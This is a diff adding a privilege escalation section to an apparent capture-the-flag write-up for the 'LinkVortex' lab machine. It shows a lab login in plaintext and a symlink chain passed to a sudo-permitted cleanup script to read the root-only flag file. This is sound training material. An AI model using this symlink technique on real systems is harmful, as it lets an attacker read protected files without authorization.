@@ -178,3 +178,17 @@ Credentials `bob@linkvortex.htb`:`fibber-talented-worth`
 ## Privilege Escalation
 
     sudo -l
+
+![image](https://github.com/user-attachments/assets/51b37afb-2b3b-4723-92e9-b486756dc25a)
+
+    cat /opt/ghost/clean_symlink.sh 
+
+![image](https://github.com/user-attachments/assets/caeda757-c65d-4cf1-906d-ef0b40313c73)
+
+    ln -s /root/root.txt text.txt
+    ln -s /home/bob/text.txt image.png
+    sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/image.png
+
+### Get the root flag!
+
+![image](https://github.com/user-attachments/assets/351d6592-b4d0-4c94-9d32-a22d21b6b6e2)
